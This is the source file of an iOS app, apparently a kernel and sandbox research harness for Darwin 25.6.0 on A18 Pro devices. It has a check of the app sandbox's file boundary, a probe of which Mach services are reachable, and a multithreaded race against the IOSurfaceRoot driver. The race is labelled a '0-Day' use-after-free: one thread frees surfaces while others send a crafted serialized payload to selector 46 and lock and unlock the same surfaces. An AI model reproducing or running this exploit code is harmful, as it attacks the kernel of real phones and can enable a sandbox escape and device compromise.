//
//  main.m
//  Darwin25Probe
//
//  UIKit GUI Harness for Darwin 25.6.0 / A18 Pro Kernel & Sandbox Research
//

#import <UIKit/UIKit.h>
#import <mach/mach.h>
#import <IOKit/IOKitLib.h>
#import <IOSurface/IOSurfaceRef.h>
#import <pthread.h>
#import <stdatomic.h>
#import <sys/stat.h>
#import <dirent.h>

extern kern_return_t bootstrap_look_up(mach_port_t bp, const char *service_name, mach_port_t *sp);
extern mach_port_t bootstrap_port;

#define IOSURFACE_ROOT_SERVICE "IOSurfaceRoot"
#define SELECTOR_CREATE_SURFACE        0
#define SELECTOR_RELEASE_SURFACE       1
#define SELECTOR_LOCK_SURFACE          8
#define SELECTOR_UNLOCK_SURFACE        9
#define SELECTOR_DESERIALIZE_SURFACE   46

static const unsigned char kSerializedPayload[] = {
    0x62, 0x70, 0x6c, 0x69, 0x73, 0x74, 0x30, 0x30,
    0xd1, 0x01, 0x02, 0x5f, 0x10, 0x10, 0x49, 0x4f,
    0x53, 0x75, 0x72, 0x66, 0x61, 0x63, 0x65, 0x41,
    0x6c, 0x6c, 0x6f, 0x63, 0x53, 0x69, 0x7a, 0x65,
    0x10, 0x00, 0x08, 0x0b, 0x1e, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x20
};

static const char *kAllowedServices[] = {
    "com.apple.FontServicesDaemon",
    "com.apple.CARenderServer",
    "com.apple.audio.AudioComponentRegistrar",
    "com.apple.uikit.modelassertionservice",
    "com.apple.powerlog.plxpclogger.xpc",
    "com.apple.system.logger",
    NULL
};

@interface ViewController : UIViewController
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, strong) UIButton *btnEgress;
@property (nonatomic, strong) UIButton *btnMach;
@property (nonatomic, strong) UIButton *btnRace;
@end

static ViewController *g_vc = nil;
static io_connect_t g_connection = MACH_PORT_NULL;
static atomic_uint g_active_surface_id = 0;
static atomic_bool g_running = false;
static atomic_ulong g_race_iterations = 0;

static void appendLog(NSString *text) {
    dispatch_async(dispatch_get_main_queue(), ^{
        if (g_vc && g_vc.logView) {
            g_vc.logView.text = [g_vc.logView.text stringByAppendingFormat:@"%@\n", text];
            [g_vc.logView scrollRangeToVisible:NSMakeRange(g_vc.logView.text.length, 0)];
        }
        NSLog(@"%@", text);
    });
}

#ifndef kIOMainPortDefault
#define kIOMainPortDefault MACH_PORT_NULL
#endif

static io_connect_t open_iosurface(void) {
    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
                                                       IOServiceMatching(IOSURFACE_ROOT_SERVICE));
    if (!service) return MACH_PORT_NULL;
    io_connect_t connect = MACH_PORT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connect);
    IOObjectRelease(service);
    return (kr == KERN_SUCCESS) ? connect : MACH_PORT_NULL;
}

static IOSurfaceRef create_surface_ref(uint32_t *out_sid) {
    NSDictionary *props = @{
        (id)kIOSurfaceAllocSize: @(16384),
        (id)kIOSurfaceWidth: @(64),
        (id)kIOSurfaceHeight: @(64),
        (id)kIOSurfaceBytesPerRow: @(256),
        (id)kIOSurfaceBytesPerElement: @(4),
        (id)kIOSurfacePixelFormat: @(0x42475241) // 'BGRA'
    };
    IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (surf) {
        *out_sid = IOSurfaceGetID(surf);
        return surf;
    }
    *out_sid = 0;
    return NULL;
}

static void *thread_freer(void *arg) {
    while (atomic_load(&g_running)) {
        uint32_t sid = 0;
        IOSurfaceRef surf = create_surface_ref(&sid);
        if (sid == 0 || !surf) continue;

        atomic_store(&g_active_surface_id, sid);

        for (volatile int i = 0; i < 40; i++);

        CFRelease(surf);
        uint64_t scalar_in = sid;
        IOConnectCallScalarMethod(g_connection, SELECTOR_RELEASE_SURFACE, &scalar_in, 1, NULL, NULL);

        atomic_store(&g_active_surface_id, 0);
        atomic_fetch_add(&g_race_iterations, 1);
    }
    return NULL;
}

static void *thread_deserializer(void *arg) {
    uint64_t scalar_out[2];
    uint32_t scalar_out_cnt = 2;
    while (atomic_load(&g_running)) {
        uint32_t sid = atomic_load(&g_active_surface_id);
        if (sid == 0) continue;
        scalar_out_cnt = 2;
        IOConnectCallMethod(g_connection,
                            SELECTOR_DESERIALIZE_SURFACE,
                            NULL, 0,
                            kSerializedPayload, sizeof(kSerializedPayload),
                            scalar_out, &scalar_out_cnt,
                            NULL, NULL);
    }
    return NULL;
}

static void *thread_locker(void *arg) {
    uint64_t scalar_in = 0;
    uint64_t scalar_out = 0;
    uint32_t scalar_out_cnt = 1;
    while (atomic_load(&g_running)) {
        uint32_t sid = atomic_load(&g_active_surface_id);
        if (sid == 0) continue;
        scalar_in = sid;
        scalar_out_cnt = 1;
        IOConnectCallMethod(g_connection, SELECTOR_LOCK_SURFACE, &scalar_in, 1, NULL, 0, &scalar_out, &scalar_out_cnt, NULL, NULL);
        char unlock_struct[4] = {0};
        IOConnectCallMethod(g_connection, SELECTOR_UNLOCK_SURFACE, NULL, 0, unlock_struct, sizeof(unlock_struct), NULL, NULL, NULL, NULL);
    }
    return NULL;
}

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    g_vc = self;
    self.view.backgroundColor = [UIColor colorWithRed:0.08 green:0.08 blue:0.10 alpha:1.0];

    UILabel *titleLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 60, self.view.bounds.size.width - 40, 30)];
    titleLabel.text = @"Darwin 25.6.0 Research Probe";
    titleLabel.textColor = [UIColor whiteColor];
    titleLabel.font = [UIFont boldSystemFontOfSize:20];
    titleLabel.textAlignment = NSTextAlignmentCenter;
    [self.view addSubview:titleLabel];

    UILabel *subLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 95, self.view.bounds.size.width - 40, 20)];
    subLabel.text = @"A18 Pro (T8140) Kernel & Sandbox Audit";
    subLabel.textColor = [UIColor lightGrayColor];
    subLabel.font = [UIFont systemFontOfSize:14];
    subLabel.textAlignment = NSTextAlignmentCenter;
    [self.view addSubview:subLabel];

    CGFloat btnWidth = self.view.bounds.size.width - 40;
    CGFloat y = 130;

    self.btnEgress = [self makeButton:@"1. Check Sandbox File Boundary" y:y action:@selector(actionEgress)];
    y += 50;
    self.btnMach = [self makeButton:@"2. Audit Allowed Mach Services" y:y action:@selector(actionMach)];
    y += 50;
    self.btnRace = [self makeButton:@"3. Trigger IOSurface Race (0-Day)" y:y action:@selector(actionRace)];
    self.btnRace.backgroundColor = [UIColor colorWithRed:0.8 green:0.2 blue:0.2 alpha:1.0];
    y += 60;

    self.logView = [[UITextView alloc] initWithFrame:CGRectMake(20, y, btnWidth, self.view.bounds.size.height - y - 40)];
    self.logView.backgroundColor = [UIColor colorWithRed:0.03 green:0.03 blue:0.04 alpha:1.0];
    self.logView.textColor = [UIColor colorWithRed:0.2 green:0.9 blue:0.4 alpha:1.0];
    self.logView.font = [UIFont fontWithName:@"Menlo" size:12];
    self.logView.editable = NO;
    self.logView.layer.cornerRadius = 8;
    self.logView.layer.borderColor = [UIColor darkGrayColor].CGColor;
    self.logView.layer.borderWidth = 1;
    [self.view addSubview:self.logView];

    appendLog(@"[*] Ready. Select a probe function.");
}

- (UIButton *)makeButton:(NSString *)title y:(CGFloat)y action:(SEL)action {
    UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem];
    btn.frame = CGRectMake(20, y, self.view.bounds.size.width - 40, 42);
    [btn setTitle:title forState:UIControlStateNormal];
    [btn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    btn.backgroundColor = [UIColor colorWithRed:0.18 green:0.22 blue:0.32 alpha:1.0];
    btn.layer.cornerRadius = 8;
    btn.titleLabel.font = [UIFont boldSystemFontOfSize:14];
    [btn addTarget:self action:action forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:btn];
    return btn;
}

- (void)actionEgress {
    appendLog(@"\n[*] Testing Sandbox container.sb egress...");
    const char *target = "/private/var/containers/Bundle/Application";
    DIR *d = opendir(target);
    if (d) {
        appendLog(@"[+] UNRESTRICTED: Opened /var/containers/Bundle/Application!");
        closedir(d);
    } else {
        appendLog([NSString stringWithFormat:@"[-] BLOCKED by container.sb: opendir returned errno %d (%s)",
                   errno, strerror(errno)]);
    }
}

- (void)actionMach {
    appendLog(@"\n[*] Probing allowed Mach services from container.sb:");
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        for (int i = 0; kAllowedServices[i] != NULL; i++) {
            const char *svc = kAllowedServices[i];
            mach_port_t port = MACH_PORT_NULL;
            kern_return_t kr = bootstrap_look_up(bootstrap_port, (char *)svc, &port);
            if (kr == KERN_SUCCESS) {
                appendLog([NSString stringWithFormat:@"[+] Accessible: %s (port: 0x%x)", svc, port]);
                mach_port_deallocate(mach_task_self(), port);
            } else if (kr == 1100) {
                appendLog([NSString stringWithFormat:@"[-] Filtered: %s (BOOTSTRAP_UNKNOWN_SERVICE 1100)", svc]);
            } else {
                appendLog([NSString stringWithFormat:@"[-] Blocked: %s (code: %d)", svc, kr]);
            }
        }
        appendLog(@"[*] Mach service probe complete.");
    });
}

- (void)actionRace {
    if (atomic_load(&g_running)) {
        appendLog(@"[*] Halting active race engine...");
        atomic_store(&g_running, false);
        [self.btnRace setTitle:@"3. Trigger IOSurface Race (0-Day)" forState:UIControlStateNormal];
        self.btnRace.backgroundColor = [UIColor colorWithRed:0.8 green:0.2 blue:0.2 alpha:1.0];
        return;
    }

    appendLog(@"\n[!] ARMED: Initializing IOSurface Method 46 UAF Race...");
    g_connection = open_iosurface();
    if (g_connection == MACH_PORT_NULL) {
        appendLog(@"[-] Failed to open IOSurfaceRoot service.");
        return;
    }
    appendLog([NSString stringWithFormat:@"[+] Driver handle: 0x%x", g_connection]);

    uint32_t test_sid = 0;
    IOSurfaceRef test_surf = create_surface_ref(&test_sid);
    if (!test_surf || test_sid == 0) {
        appendLog(@"[-] Surface creation failed! Allocator rejected parameters.");
        IOServiceClose(g_connection);
        return;
    }
    appendLog([NSString stringWithFormat:@"[+] Surface allocator verified: test surface ID %u", test_sid]);
    CFRelease(test_surf);

    atomic_store(&g_running, true);
    atomic_store(&g_race_iterations, 0);
    [self.btnRace setTitle:@"[STOP RACE]" forState:UIControlStateNormal];
    self.btnRace.backgroundColor = [UIColor colorWithRed:0.9 green:0.6 blue:0.1 alpha:1.0];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        pthread_t t1, t2, t3;
        pthread_create(&t1, NULL, thread_freer, NULL);
        pthread_create(&t2, NULL, thread_deserializer, NULL);
        pthread_create(&t3, NULL, thread_locker, NULL);

        appendLog(@"[+] 3 worker threads dispatched. Monitoring race window...");

        while (atomic_load(&g_running)) {
            sleep(1);
            unsigned long count = atomic_load(&g_race_iterations);
            appendLog([NSString stringWithFormat:@"[*] Race active | Iterations: %lu", count]);
        }

        pthread_join(t1, NULL);
        pthread_join(t2, NULL);
        pthread_join(t3, NULL);
        IOServiceClose(g_connection);
        appendLog(@"[*] Race threads stopped cleanly.");
    });
}

@end

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    self.window.rootViewController = [[ViewController alloc] init];
    [self.window makeKeyAndVisible];
    return YES;
}
@end

int main(int argc, char * argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
